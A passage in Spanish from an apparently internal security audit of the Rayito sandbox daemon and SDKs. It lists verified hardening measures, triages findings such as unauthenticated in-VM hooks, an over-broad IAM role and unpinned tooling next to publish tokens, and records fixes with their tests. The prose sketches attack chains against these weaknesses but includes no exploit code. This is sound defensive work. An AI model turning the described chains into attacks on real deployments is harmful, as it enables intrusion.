  el spawn en vez de ejecutar con privilegios a medias. Los hooks uid/gid de
  `std::process::Command` no se usan, así que no hay una segunda caída
  desordenada.
- **Entorno del hijo construido desde cero**: `.env_clear()` + `build_child_env`
  en los tres caminos (`process_spawner.rs:186-187`, `pty_backend.rs:86-87`,
  `sidecar_process.rs:162-163`), que sólo emite `PATH`/`HOME`/`USER`/`LOGNAME` más
  el payload y los `envs` de la petición (`rayd-core/src/process/env.rs:274-287`).
  Ningún `AWS_*`, `RAYD_LOG` ni `RAYITO_ALLOW_ROOT` llega a un hijo — y no hay
  secreto en claro que filtrar, porque `rayd` sólo tiene el digest.
- **`RAYITO_ALLOW_ROOT` se lee una vez al arrancar** (`main.rs:149`) y sólo acepta
  el literal `"1"` (`process/identity.rs:37-41`): no es influenciable por
  petición.
- **PTY y terminal de control**: `setsid()` → `ioctl(0, TIOCSCTTY, 0)` con
  argumento 0 (sin robo) → caída de privilegios, todo en un `pre_exec`
  (`adapters/pty_backend.rs:98-102`), y el esclavo se `fchown`/`fchmod 0620` a la
  identidad antes del spawn (`:145-154`). `process_group(0)` se omite a propósito
  porque haría fallar `setsid` con `EPERM`.
- **`resolve_shell`** (`rayd-core/src/pty/mod.rs:92-105`) rechaza shells relativos
  y bytes NUL: siempre ruta absoluta, nunca búsqueda por `PATH`.
- **Superficie de señales acotada**: `validate_signal` limita a 1..=64 y rechaza
  el 0, y tanto `SendSignal` como `Pty.Kill` exigen que el pid esté vivo en el
  registro, así que un cliente no puede señalar un pid arbitrario del guest.
- **El tope de 256 procesos no se puede correr**: `ensure_capacity` + spawn +
  `register` + primer attach ocurren bajo un solo lock del registro
  (`process/manager.rs:246-261`, `pty/manager.rs:221-235`), compartido con los
  PTYs.
- **Los rlimits se aplican de verdad**, con recorte al hard heredado
  (`process_spawner.rs:265-286`), coherente con el `RLIMIT_NOFILE` hard de 1024
  medido; `RLIMIT_CPU` sólo se baja, nunca se sube (`limits.rs:562-573`).
- **Postura del sidecar**: mismo `PreExecPlan` que cualquier hijo, grupo de
  procesos propio, entorno desde cero sin secretos
  (`adapters/sidecar_process.rs:157-173`), spec construida sin los `envs` del
  payload ni `cpu_seconds`. Su stderr no puede colar contenido de celda en el log
  de `rayd`: `parse_sidecar_log_line` mantiene una lista blanca de 29 claves y
  cuenta —nunca reemite— lo que no case (`sidecar_process.rs:11-74`).
- **El código del sandbox no puede tocar a `rayd` por el filesystem**:
  `/usr/local/bin/rayd` es 0755 de root, y un segundo `rayd` lanzado por el
  sandbox es inerte porque el gate falla cerrado con `TokenNotInstalled`.

### 7.3 Filesystem

- **`RequestPath::parse`** (`filesystem/path.rs:51`) rechaza vacío, NUL y
  cualquier componente `..` sin resolverlo léxicamente (que es lo correcto a
  través de symlinks), colapsa `//`, `.` y la barra final, y ancla las rutas
  relativas al `HOME` de la identidad.
- **`has_component_prefix`** (`path.rs:194`) compara componentes completos, así
  que `/etcetera` y `/run/user/1000` no se deniegan mientras `/etc/passwd` y
  `/run/rayito/x` sí.
- **`realpath` antes del chequeo en todas las operaciones** (`ops.rs:286,304,332`),
  así que `/proc/self/root`, `/var/run/...` y los symlinks de compatibilidad de
  al2023 (`/bin`→`/usr/bin`, `/lib`→`/usr/lib`, `/sbin`→`/usr/sbin`) quedan
  cubiertos; `canonical_creating` canonicaliza el ancestro existente más profundo
  antes de añadir léxicamente lo que falta.
- **`open_read`** (`adapters/std_filesystem.rs:89`) usa
  `O_RDONLY|O_NOFOLLOW|O_CLOEXEC|O_NONBLOCK` y después rechaza directorios y
  ficheros no regulares, así que ni un symlink final ni un FIFO sin escritor
  bloquean un hilo del pool.
- **`read_dir`** (`std_filesystem.rs:66`) usa `DirEntry::metadata()`, que es
  `lstat` y no atraviesa, así que los directorios enlazados se clasifican
  `EntryKind::Symlink` y `listing.rs:99` nunca desciende por ellos.
- **`Remove` recursivo** usa `std::fs::remove_dir_all` en Rust 1.98
  (`rust-toolchain.toml`), es decir la implementación posterior a CVE-2022-21658,
  con `openat`/`unlinkat` y sin carrera de symlinks.
- **Escritura atómica correcta** (`std_filesystem.rs:117,191`):
  `tempfile::Builder` crea `.rayito-tmp-<aleatorio>` con `O_CREAT|O_EXCL` a 0600
  **dentro del directorio destino** (sin nombre predecible), `Drop` lo desenlaza
  ante cualquier fallo o cancelación, y `persist` es un `rename`, así que un
  symlink en el destino se reemplaza en vez de seguirse.
- **No se puede producir un fichero setuid-root por `Write`**: `commit` hace
  `fchmod` y luego `fchown`, y el kernel limpia `S_ISUID`/`S_ISGID` al hacer
  `chown` de un no-directorio (`write.rs:364`, `std_filesystem.rs:199`).
- **`Move`** (`ops.rs:98`) rechaza `/` en ambos lados, resuelve los dos extremos
  por `canonical_existing`, y `rename(2)` no sigue symlinks en ninguno de los dos
  componentes finales; el binario de `rayd` está cubierto por tres vías (`/usr`,
  la constante `RAYD_BINARY` y la ruta canónica del ejecutable en curso añadida en
  `main.rs`).
- **Ningún `Display` de `FilesystemError` cita una ruta, un nombre de entrada, un
  destino de symlink ni contenido**; hay un test que lo fija.
- **`FsIdentityGuard`** (`adapters/fs_identity.rs:49`) se entra dentro de cada
  método del puerto, verifica el cambio con una sonda `setfsuid(-1)`/`setfsgid(-1)`
  y falla cerrado con `PermissionDenied`, restaura en orden inverso en `Drop`, y
  nunca cruza un `.await` (todos los métodos son síncronos sobre
  `spawn_blocking`).
- **Extracción de tar** (`adapters/tar_archiver.rs`): `unpack_in` contra el `HOME`
  canónico, nombres absolutos rechazados, sólo ficheros regulares/directorios/
  symlinks (sin hard links, dispositivos ni FIFOs), modo enmascarado y
  `preserve_permissions`/`ownerships`/`xattrs` desactivados. No se encontró
  ningún *tar slip*.

### 7.4 Persistencia

- **Confinamiento de la extracción** (`tar_archiver.rs:485-522`): tipos de entrada
  en lista blanca, nombres absolutos rechazados **antes** de que `tar-rs` pueda
  re-enraizarlos, `unpack_in()` valida contra el destino, la ruta de fichero
  regular usa `create_new` + `remove_file` (así que un symlink existente nunca se
  sigue), `set_preserve_permissions(false)` enmascara a 0o777 (ningún fichero
  restaurado es setuid) y `set_preserve_ownerships(false)` impide cualquier
  `chown`.
- **Caída de privilegios en las dos mitades**: archivar, contar y extraer entran
  en `FsIdentityGuard`, que lee de vuelta el cambio y falla cerrado, así que el
  checkpoint lee **como el usuario** y el restore escribe como el usuario.
- **El `HOME` de root se rechaza** para persistencia con independencia de
  `RAYITO_ALLOW_ROOT` (`persistence/mod.rs:103-120`).
- **Validación de bucket y prefijo** (`persistence/keys.rs:66-144`): longitud,
  juego de caracteres, caracteres de los extremos, `..`, buckets con forma de IPv4,
  barra inicial y final, componentes vacíos, tope de 900 bytes — y ningún rechazo
  cita la entrada ofensora.
- **La descarga del manifest está acotada mientras fluye**, no después
  (`restore.rs:94-106` con el tope de 64 KiB de `manifest.rs:70-74`), así que un
  `manifest.json` enorme no agota memoria.
- **Ningún log ni error visible al cliente lleva credencial, bucket, clave,
  prefijo o ruta**: los `Display` son frases fijas (`persistence/error.rs:36-86`) y
  el adaptador de S3 registra sólo operación, resultado, `s3_error_code`,
  `s3_request_id`, `http_status` y recuentos (`adapters/s3_store.rs:420-446`).
- **Los multipart se abortan en todos los caminos** —fallo de parte, fallo de
  complete, origen interrumpido y `Drop` al cancelar el futuro— dentro de un
  presupuesto de 5 s (`s3_store.rs:286-400`), y el fallo del abort se registra,
  nunca se propaga.
- **El protocolo de canal usa un frame `End` explícito** (`persistence/channels.rs:87-110`),
  así que un hilo de archivado que muere a mitad se reporta como
  `StoreErrorKind::Interrupted` y **nunca** se completa en S3 un archivo truncado.
- **El lease de una operación por sandbox se libera en todos los caminos**,
  incluido un cliente que desaparece antes del mensaje `Started`, porque vive
  dentro del `Prepared*` que posee la tarea (`persistence/mod.rs:148-158`,
  `persistence/manager.rs:193-215`).
- **La lista de exclusión** sigue las mismas reglas que las rutas de petición: sin
  absolutas, sin `..`, sin NUL, 4096 bytes por entrada, 64 entradas, comparación
  por componentes completos (`persistence/plan.rs:65-125`).
- **El recorrido del checkpoint** no desciende por directorios enlazados, no cruza
  de sistema de ficheros, y salta —contando— lo que no puede leer, en vez de
  leerlo como root (`tar_archiver.rs:171-246`).

### 7.5 SDKs, CLI y MCP

- **TLS**: no hay `verify=False`, `insecure_channel`, `rejectUnauthorized:false`
  ni `NODE_TLS_REJECT_UNAUTHORIZED` en `clients/python/src` ni en
  `clients/typescript/src`. Python siempre usa `grpc.secure_channel` con las
  credenciales por defecto (`_transport.py:176-198`); TypeScript usa
  `scheme: "https"` y `assertPlaintextAllowed` (`transport/transport.ts:91`)
  rechaza `http` hacia cualquier host que no sea loopback.
- **El reintento tras un 403 del proxy está acotado en todas partes**:
  `_call_unary_once` (`sandbox_sync/main.py:1096`), `_first_message_reminting`
  (`:1230`), `probe_health_reminting` (`:268`) y sus gemelos de TypeScript
  reacuñan **una vez** y propagan; además `TokenBucket` (`_aws.py:141`) limita
  `create-microvm-auth-token` a la cuota publicada.
- **Ni el access token ni el JWE llegan a logs, excepciones o `repr`**:
  `LaunchOptions.__repr__` (`_models.py:687`) y `SlotRecord.__repr__`
  (`_pool_base.py:229`) los redactan, `describeRecord` (`pool/core.ts:51`) usa
  REDACTED, y `HostAccess.headers` lleva el JWE pero **nunca** el access token, de
  modo que un servicio en un puerto de usuario no ve el secreto del sandbox.
- **El servidor MCP no puede alcanzar sandboxes que no creó**: `list_sandboxes`
  (`mcp/_server.py:262`) devuelve sólo id/estado/template/versión/`startedAt`, no
  hay herramienta que acepte un id o un token, y `silence_payload_loggers`
  (`:148`) fija botocore/boto3/urllib3 a WARNING para que un
  `RAYITO_MCP_LOG_LEVEL` en DEBUG no vuelque el `runHookPayload` ni el JWE.
- **Los argumentos de ruta del MCP se pasan tal cual a `FilesystemService`**, que
  es lo correcto: la defensa contra traversal es del servidor (T11) y duplicarla
  en el cliente sería redundante, no una mitigación ausente. `depth` está acotado
  a 1..5 y los timeouts a 1..3600 por `Field`.
- **`rayito doctor` no imprime secretos**: el JWE acuñado se queda en
  `DoctorContext.minted_token` y sólo alimenta a `PremintedControlPlane`
  (`cli/_checks.py:560`); `token_details` emite id/puerto/ttl/origen y el
  catch-all registra `type(exc).__name__`, así que `render_json` no puede
  serializar un secreto.
- **No hay inyección en la construcción de comandos**: `build_start_request`
  (`_process_base.py:76`) coloca `cmd` en `args[2]` de un argv y pasa `cwd`, `user`
  y `envs` como campos separados del protobuf; nada se interpola en una cadena de
  shell en ninguno de los dos SDKs.
- **`create`/`connect` no se pueden desviar a un endpoint suministrado por el
  servidor** fuera del camino del pool: `info.endpoint` viene de la respuesta de
  `run-microvm`/`get-microvm` y `normalize_endpoint` (`_aws.py:399`) quita esquema
  y ruta antes de usarlo.
- **La protección del puerto de hooks es coherente en ambos SDKs**:
  `proxy_port_specs` rechaza cualquier rango que cubra 9000
  (`_sandbox_base.py:176`), `validate_host_port` rechaza `get_host(9000)` (`:198`),
  TypeScript hace lo mismo (`sandbox/launch.ts:152,168`) y `PortSpec` no tiene
  ninguna representación de `allPorts` (`_aws.py:47`).
- **Deserialización segura de la salida del kernel**: `json.loads` y mapeo a un
  conjunto fijo de campos en dataclasses congeladas (`_charts.py:161`,
  `_code_base.py:196`), con los tipos de gráfico desconocidos degradando a
  `ChartType.UNKNOWN`. No hay `eval`, `exec`, `pickle` ni `getattr` dinámico sobre
  nombres controlados por el atacante en todo el árbol de cliente.

### 7.6 Cadena de suministro y CI

- **Disparadores y permisos**: ningún `pull_request_target`, `workflow_run` ni
  `issue_comment` en los seis workflows; `permissions: contents: read` global, con
  elevación sólo por job.
- **`persist-credentials: false`** en todos los `actions/checkout` (`ci.yml:30,99,
  123,149,165,204,230,272`, `release.yml:123,171,231`, `e2e.yml:83,137`,
  `scorecard.yml:158`), así que no queda un `GITHUB_TOKEN` en `.git/config` para
  que lo robe un script de build.
- **Sin inyección de script**: cada `${{ inputs.* }}` / `${{ github.* }}` llega al
  shell por un binding `env:` y se referencia como variable entrecomillada
  (`release.yml:69-91`, `e2e.yml:102-110`, `ci.yml:57-59`, `release.yml:274-284`).
- **Ningún secreto se imprime**: la única referencia a `secrets.*` del repositorio
  es `secrets.RELEASE_PLEASE_TOKEN` pasada como input de una acción
  (`release-please.yml:124`).
- **`actionlint` se descarga por curl pero su tarball se verifica por sha256**
  contra una constante pinneada antes de extraerse (`ci.yml:36-41`), y hoy las 16
  referencias `uses:` son SHA de 40 hex con comentario de versión.
- **Los guardarraíles de coste y radio de `e2e.yml` existen y funcionan**:
  `concurrency: e2e` con `cancel-in-progress: false`, `timeout-minutes` en ambos
  jobs, pre-flight que falla con más de 10 MicroVM vivos, y un sweeper
  `if: always()` que termina todo MicroVM no terminado de la plantilla.
- **El cuerpo de la política de `infra/ci-oidc-role.yaml` es mínimo de verdad**:
  sólo verbos de ciclo de vida de MicroVM sobre `TestImageArns`, `ListMicrovms`
  sobre `*` (la API no tiene autorización por recurso para él),
  `PassNetworkConnector` sólo sobre el conector gestionado, `iam:PassRole`
  condicional y sobre un único rol, `MaxSessionDuration: 3600`.
- **`deny.toml`**: `yanked = "deny"`, `wildcards = "deny"`,
  `unknown-registry`/`unknown-git` en deny, sólo crates.io, lista blanca de
  licencias con la excepción nominal `notify`/CC0-1.0 y tres targets auditados; se
  ejecuta en `ci.yml` y cada lunes en `audit.yml`.
- **`image/Dockerfile:48`** fija la base por digest de manifest list con el digest
  arm64 anotado y una receta de refresco; `dnf install` usa lista explícita con
  `--setopt=install_weak_deps=0`.
- **Higiene del artefacto** (`cli/_artifact.py`): se excluyen `__pycache__`,
  `*.pyc`, `tests/`, `.venv`, cachés de herramientas, `uv.lock` y zips anidados, y
  las fechas y modos se fijan para que el hash dependa sólo del contenido;
  `image/rayd`, `image/*.zip` y `image/kernel-sidecar/` están en `.gitignore`.
- **Aislamiento de stdio de los kernels**: `kernels.py:556-558` los arranca con
  `stdout=DEVNULL, stderr=DEVNULL`, así que el código de usuario no puede escribir
  líneas JSON crudas en el stdout del sidecar; el directorio del connection file
  se crea 0700 y se vuelve a `chmod`.
- **El protocolo sidecar → `rayd` está endurecido**: `decode_event`
  (`rayd-core/src/code/protocol.rs:279-291`) rechaza nombres de evento
  desconocidos antes de deserializar y nunca cita la línea ofensora,
  `MAX_SIDECAR_LINE_BYTES` es 16 MiB, el sidecar se autolimita por debajo y
  degrada a `rayito/omitted` en vez de emitir una línea fatal, y
  `SidecarLogger.ALLOWED_FIELDS` (`logging.py:16-50`) descarta cualquier campo
  fuera de una lista blanca de 30 nombres, de modo que código, salida, `envs`,
  `cwd` y tracebacks nunca se convierten en valores de log.
- **Verificaciones de integridad de release que sí corren**:
  `scripts/check_auditable.py` (el grafo `.dep-v0` nombra `rayd` en la versión del
  workspace), `check_wheel.py` (contenido, metadatos PEP 639, entry points),
  `check_license.py` (Apache-2.0 en cinco manifiestos y copias
  byte-idénticas de `LICENSE`/`NOTICE`) y `cosign verify-blob` en el mismo job que
  firma.

## 8. Triaje

Cada hallazgo confirmado o en disputa, con la decisión. "Arreglar ahora" =
**antes de publicar el repositorio**, porque es lo que otros copiarán o porque la
documentación publicada afirma algo que el código no hace.

| Id | Hallazgo | Severidad | Decisión | Hecho |
|---|---|---|---|---|
| H-01 | Execution role alcanza el prefijo de artefactos | mayor | **Arreglar ahora**: prefijos disjuntos, `Deny` explícito y receta de `infra/README.md:159-160`. El chequeo de digest en `_publish.py:219` y el versionado del bucket, en M8 | ✔ §9 |
| H-02 | `uvx twine` sin pin junto al token OIDC de PyPI | mayor | **Arreglar ahora**: pinnear todos los `uvx` + gate de CI. La separación build/publish (que también cierra C-10), en M8 | ✔ §9 |
| C-05 | `user=` acepta uid < 1000 y gid 0 | mayor | **Arreglar ahora**: comprobación positiva en `authorize_identity` y borrar la puerta duplicada de `persistence/mod.rs:116`. Medir el `/etc/passwd` de la base y anotarlo en `AWS_API_NOTES.md`. Las dos reglas `uidrange` y el e2e, en M8 | ✔ §9 |
| C-07 | `S3Location` no ligado al sandbox | mayor | **Arreglar ahora** la documentación (el prefijo **no** separa inquilinos, en T15 y en `persistence.md`). El binding en el `runHookPayload`, en M8 | ✔ §9 |
| C-01 | Hooks en `0.0.0.0:9000` sin autenticación | mayor | **Arreglar ahora** T2 y ADR-006 (nombrar el origen dentro de la VM y añadir `/terminate` a la lista de hooks forjables). La autenticación por uid del par en `/terminate` y `/validate`, en M8 | ✔ §9 |
| H-03 | `<path>.tmp` del pool (Python) | menor | **Arreglar ahora**: `O_EXCL|O_NOFOLLOW` + `fchmod` (o `mkstemp`). Es la única forma de que la frase de T14 sea cierta | ✔ §9 |
| H-04 | `<path>.tmp` del pool (TypeScript) | menor | **Arreglar ahora**: `open(temp,'wx')` + `chmod`. Mismo defecto que H-03; no cerrar uno sin el otro | ✔ §9 |
| H-05 | `rayito-mcp --http` y 127.0.0.0/8 | menor | **Arreglar ahora**: pasar `TransportSecuritySettings` explícito (tres líneas) y la frase de `docs/site/docs/mcp.md:176` | ✔ §9 |
| H-06 | Confianza OIDC sin componente de rama | menor | **Arreglar ahora** `infra/README.md:122`. La condición `ref` o las *deployment branches*, al crear el environment (M8 si se retrasa) | ✔ §9 |
| C-11 | El gate de pinning acepta tags y `@latest` | menor | **Arreglar ahora**: una línea de `grep` invertido, e iguala el código a lo que `SECURITY.md:157` ya afirma | ✔ §9 |
| C-13 | `AllowedPattern` de `PersistencePrefix` permite `*` | menor | **Arreglar ahora**: sólo el patrón de CloudFormation. **No** tocar `_models.py` ni `keys.rs` | ✔ §9 |
| C-02 | `/validate` forjado reinicia el kernel por defecto | menor | **Arreglar ahora** la frase de T2 ("el kernel no se reinicia"). La guarda por `run_claimed` y la retirada de `execute_unchecked`, en M8 | ✔ §9 |
| C-03 | `/ready` y `/validate` sin auditar | menor | **Arreglar ahora** `ARCHITECTURE.md:299-300` y T2 ("cada hook de runtime"). Las dos llamadas a `audit()`, en M8 | ✔ §9 |
| C-04 | `Health` anónimo entrega `metadata` al propio sandbox | menor | **Arreglar ahora** T4 y `docs/site/docs/security.md`. **Aceptar** el conjunto de campos: partirlo rompe la sonda de readiness y el contrato del `.proto` 0.2.0 | ✔ §9 |
| C-08 | `RAYITO_ACCESS_TOKEN` compartido por `create()` | menor | **Arreglar ahora** `concepts.md:115` y T4, más un `logger.warning` de una sola vez. El opt-out del servidor MCP, en M8 | ✔ §9 |
| C-09 | `CallerPolicy` con verbos de imagen | menor | **Arreglar ahora**: la frase de `SECURITY.md:85` (es la política del *publicador*) y quitar `lambda:DeleteMicrovmImage`, que no usa nadie. Acotar el recurso a imágenes nombradas y el split runtime/publicador, en M8 | ✔ §9 |
| C-10 | Scripts de ciclo de vida de npm junto al token OIDC | menor | **M8**: separar build y publish (misma corrección que el residuo de H-02). `.npmrc` con `ignore-scripts=true` es barato pero por sí solo es cosmético | — |
| C-12 | `pip install` sin `--require-hashes` en la imagen | menor | **M8**: regenerar los dos ficheros de pines con `--generate-hashes` y añadir `--require-hashes` y `--no-deps` | — |
| C-06 | TOCTOU entre `realpath` y la llamada al sistema | menor | **Aceptar con razón documentada**, corrigiendo la frase de D2 (la carrera **sí** alcanza `/proc/self/{maps,smaps,numa_maps}`). `openat2` con `RESOLVE_BENEATH`, en la lista de endurecimiento de M8 | — |

Resumen del triaje: **11 antes de publicar** (de las cuales 6 son cambios de una
a cinco líneas y 5 son frases de documentación), **7 en M8**, **1 aceptado** con
razón escrita.

## 9. Estado de las correcciones

**2026-09-22** (mismo día que la auditoría), sobre el mismo árbol 0.2.0 en
disco. Las **16 filas marcadas "Arreglar ahora"** de §8 —las 11 correcciones
del resumen del triaje: 6 de código, IAM y CI, y 5 de documentación— están
**cerradas**. Las 7 filas marcadas **M8** y la fila **aceptada** (C-06) siguen
abiertas a propósito; §8 las enumera y dice por qué.

El trabajo entró por dos cambios de OpenSpec, los dos archivados:
`m8-security-fixes` (código, IAM y CI) y `m8-security-docs` (las frases que no
coincidían con el código). Ninguna corrección necesitó una llamada a AWS, una
imagen nueva ni un e2e: el triaje eligió a propósito filas verificables en
local. Cuentas de tests del árbol corregido: **Rust 388**, **Python 1082**,
**TypeScript 388**, **`scripts/tests` 77**.

| Id | Corrección (`file:line`) | Prueba que la fija |
|---|---|---|
| H-01 | `infra/iam.yaml:30` (`Default: rayito-home`, disjunto de `rayito/` por construcción) y `:127-132` (`Deny` `NeverTheImageArtifacts` sobre `<ArtifactBucket>/rayito/*`); receta corregida en `infra/README.md:160-180` | `scripts/tests/test_iam_template.py::test_persistence_prefix_default_is_disjoint_from_the_artifact_namespace` y `::test_execution_role_is_denied_the_artifact_prefix`; `scripts/tests/test_security_docs.py::test_persistence_quickstart_stays_out_of_the_artifact_namespace`; `uvx cfn-lint==1.56.3` |
| H-02 | Todo `uvx` clavado: `Makefile:103,123,186,187,243`, `.github/workflows/ci.yml:63,81,127,128`, `release.yml:139`, `audit.yml:51-61`; gate nuevo `scripts/check_pins.py` (puerta 2: `uvx <herramienta>==<versión>`) corriendo en `.github/workflows/ci.yml:45` | `scripts/tests/test_check_pins.py::test_uvx_without_a_version_is_a_finding` y `::test_the_repository_itself_is_clean` |
| C-05 | `crates/rayd-core/src/process/identity.rs:62-74` (comprobación positiva) con `is_unprivileged` en `:86-90` (`uid >= 1000 && gid >= 1000` y sin el grupo 0); la puerta duplicada desaparece — `crates/rayd-core/src/persistence/mod.rs:106-112` llama a la misma política con `without_root()` | `rayd_core`: `process::identity::tests::system_accounts_are_refused`, `::without_root_drops_the_image_opt_in`, `persistence::tests::a_system_account_is_never_a_persistence_identity` |
| C-13 | `infra/iam.yaml:31`: `AllowedPattern` sin `*` ni comillas, paréntesis o `!`. `clients/python/src/rayito/_models.py` y `crates/rayd-core/src/persistence/keys.rs` sin tocar, como pedía la fila | `scripts/tests/test_iam_template.py::test_persistence_prefix_pattern_refuses_a_wildcard` |
| H-03 | `clients/python/src/rayito/_pool_backends.py:110-126`: `tempfile.mkstemp()` (`O_CREAT|O_EXCL|O_WRONLY|O_NOFOLLOW`) y `fchmod` sobre el descriptor antes de escribir, después `os.replace` | `test_pool_backends.py::test_json_write_ignores_a_pre_created_temp`, `::test_json_write_never_follows_a_symlink`, `::test_json_file_mode_is_0600` |
| H-04 | `clients/typescript/src/pool/backend.ts:135-153`: `open(temp, "wx", FILE_MODE)` y `handle.chmod(FILE_MODE)`, escritura por el handle y `rename`; lectura con `O_NOFOLLOW` (`:26`) | `tests/unit/pool.test.ts`: «a pre-created temporary is never reused», «round trip, atomic write, schema and permissions», «no temporary is left behind» |
| H-05 | `clients/python/src/rayito/mcp/_cli.py:108-119` (`TransportSecuritySettings` siempre explícito) y `:158` (se pasa al servidor); `--host` comodín rechazado con exit 2 (`:121-127`); frase corregida en `docs/site/docs/mcp.md:175-190` | `test_mcp_main.py::test_run_http_always_passes_explicit_transport_security`, `::test_parse_args_rejects_a_wildcard_host`, `::test_http_authority_brackets_ipv6` |
| C-11 | `scripts/check_pins.py` (puerta 1: lista blanca, falla salvo que el `uses:` sea un SHA de 40 hex con comentario opcional) corriendo en `.github/workflows/ci.yml:45`; iguala el código a lo que `SECURITY.md` ya afirmaba, y la fila «CI» de esa página pasa a nombrar el gate real en vez del `grep` que sustituyó | `scripts/tests/test_check_pins.py::test_tag_alias_branch_and_short_sha_are_unpinned` y `::test_full_sha_local_action_and_quoted_uses_are_pinned` |
| H-06 | `infra/README.md:118-130`: el `sub` con environment **no** lleva componente de rama, y las *deployment branches* del environment se fijan a `main` al crearlo | `scripts/tests/test_security_docs.py::test_oidc_trust_has_no_branch_component` |
| C-01 | `SECURITY.md:54` (T2) nombra el origen de dentro de la VM (`0.0.0.0:9000`, mismo netns, cualquier proceso uid 1000) e incluye `/terminate` entre los hooks forjables; `ARCHITECTURE.md:296-307` dice lo mismo | `scripts/tests/test_security_docs.py::test_t2_names_the_in_vm_origin` |
| C-02 | `SECURITY.md:54`: la frase "el kernel no se reinicia" desaparece; T2 dice que un `/validate` forjado reinicia el contexto `default` saltándose el `stream_gate` | `scripts/tests/test_security_docs.py::test_t2_names_the_in_vm_origin` y `::test_retired_sentences_are_gone` |
| C-03 | `ARCHITECTURE.md:299-303` y `SECURITY.md:54`: «cada **hook de runtime**» se audita; `/ready` y `/validate` se nombran como hooks de build que no pasan por `audit()` | `scripts/tests/test_security_docs.py::test_audit_scope_is_runtime_hooks` |
| C-04 | `SECURITY.md:56` (T4) y `docs/site/docs/security.md`: la propia carga de trabajo del sandbox lee `Health.metadata` sin credencial alguna; el conjunto de campos se acepta con razón escrita | `scripts/tests/test_security_docs.py::test_metadata_is_readable_from_inside_the_vm` |
| C-07 | `SECURITY.md:67` (T15) y `docs/site/docs/persistence.md`: el prefijo de S3 **no separa inquilinos**; aislarlos exige un execution role y un prefijo por inquilino | `scripts/tests/test_security_docs.py::test_prefix_is_not_a_tenant_boundary` |
| C-08 | `docs/site/docs/concepts.md:115` y `SECURITY.md:56` (T4): `create()` también lee `RAYITO_ACCESS_TOKEN`; aviso de una sola vez por proceso en `clients/python/src/rayito/_sandbox_base.py:119-125` (nunca el valor) | `scripts/tests/test_security_docs.py::test_access_token_env_var_is_shared_by_create`; `test_sandbox_base.py::test_environment_token_warns_once`, `::test_explicit_and_generated_tokens_never_warn`, `::test_connect_path_never_warns` |
| C-09 | `SECURITY.md:85`: `CallerPolicy` es la política del **publicador**, con `infra/ci-oidc-role.yaml` como forma mínima de runtime; `lambda:DeleteMicrovmImage` fuera de `infra/iam.yaml` (`ImagesAndMicrovms`, `:150-168`), que ningún camino de código usaba | `scripts/tests/test_security_docs.py::test_caller_policy_is_the_publisher_policy`; `scripts/tests/test_iam_template.py::test_caller_policy_never_deletes_a_whole_image` |

Cada test de la tercera columna se escribió para **fallar sin su corrección**:
los de `scripts/tests/test_security_docs.py` comprueban a la vez que el texto
corregido está y que la frase retirada no ha vuelto, y los de
`scripts/tests/test_iam_template.py` leen la plantilla ya parseada, porque
`cfn-lint` valida la forma y no la política.

### Lo que sigue abierto

De las filas de §8: **C-10** (split build/publish de npm, que también cierra el
residuo de H-02), **C-12** (`--require-hashes` en la imagen), el binding del
`S3Location` al sandbox (**C-07**), la autenticación por uid del par en
`/terminate` y `/validate` (**C-01**), la guarda por fase de `/validate`
(**C-02**), las dos llamadas a `audit()` de **C-03**, el opt-out del servidor
MCP de **C-08**, el split runtime/publicador y el recurso acotado de **C-09**,
el chequeo de digest y el versionado del bucket de **H-01**, y las dos reglas
`uidrange` y el e2e de **C-05**. **C-06** queda aceptado con razón escrita.

Fuera de las filas: el gemelo TypeScript del aviso de C-08
(`clients/typescript/src/sandbox/launch.ts`, que exige pasar el `Logger` por
`LaunchPlanInput`) y la medición del `/etc/passwd` de
`public.ecr.aws/lambda/microvms:al2023-minimal` (§10.6), de la que depende la
mitad de C-05 y que hoy es inferencia por analogía.

## 10. Qué falta para un audit completo

Esto es una auditoría interna de lectura de código sobre un árbol sin publicar.
Lo que queda pendiente, por orden de valor:

1. **Pentest externo**. Ninguna de las cadenas de este informe se ejecutó contra
   un MicroVM real. Las de mayor valor para un tercero: forjar hooks desde dentro
   de la VM (C-01, C-02), `user="operator"` sobre `rayito-base-caps` con un
   execution role (C-05), y un `Restore` desde un prefijo ajeno (C-07). Hacerlo
   requiere presupuesto de AWS y una cuenta desechable, no la del proyecto.
2. **Fuzzing**. Tres superficies lo piden y ninguna lo tiene: (a) los cinco
   servicios del `.proto` contra mensajes malformados, con `tonic`/`prost` en el
   medio; (b) la extracción de tar (`Unpacker::unpack`) con archivos hostiles
   —nombres largos GNU, cabeceras pax, ciclos de symlinks, bombas de gzip—, que
   es la única superficie donde `rayd` (root) procesa bytes de origen remoto; (c)
   el protocolo JSON de líneas del sidecar. `cargo fuzz` sobre (a) y (b) es el
   trabajo más barato con mejor retorno de esta lista.
3. **Red-team real del servidor MCP**. Aquí sólo se leyó código. El MCP es la
   superficie más nueva, la que menos cobertura de tests tiene y la única que
   expone herramientas a un modelo; H-05 salió de leer el SDK de terceros, no de
   atacar el servidor. La revisión manual desde Claude Code sigue pendiente desde
   la aceptación de M7.
4. **Verificación del autómata de ciclo de vida**. `lifecycle.rs` tiene los
   estados, las transiciones legales y el contador de pausa en un solo sitio, y
   tres de los hallazgos de este informe (C-01, C-02, R-12) son transiciones
   legales con efectos que nadie modeló. Es un candidato razonable a un modelo
   TLA+ o a tests basados en propiedades.
5. **Monitorización de CVEs de dependencias**: **ya está cableada** y no hace
   falta añadir herramienta — Dependabot semanal sobre `cargo`, `uv`, `pip`,
   `npm`, `github-actions` y `docker`; `audit.yml` cada lunes con `cargo deny`,
   `pip-audit --no-deps --strict` y `pnpm audit`; Scorecard semanal. Lo que falta
   es **la política de respuesta**: quién triage, en cuánto tiempo, y qué se hace
   cuando no hay parche (hoy `deny.toml` documenta el formato del `ignore`, pero
   no hay SLA escrito). Eso encaja en `SECURITY.md`, junto a los plazos de
   divulgación que ya están.
6. **Medición pendiente**: el `/etc/passwd` de
   `public.ecr.aws/lambda/microvms:al2023-minimal`, del que depende la mitad de
   C-05 y que hoy es inferencia por analogía — exactamente lo que la regla dura 1
   de `CLAUDE.md` prohíbe.
7. **Revisión criptográfica del camino TLS a S3**. Rayito no implementa
   criptografía propia, pero `rustls` + `aws-lc-rs` compilados con `zig cc` para
   `aarch64-unknown-linux-musl` es una combinación poco transitada, y nadie la ha
   revisado ni ha comprobado la validación de cadena contra un endpoint hostil.
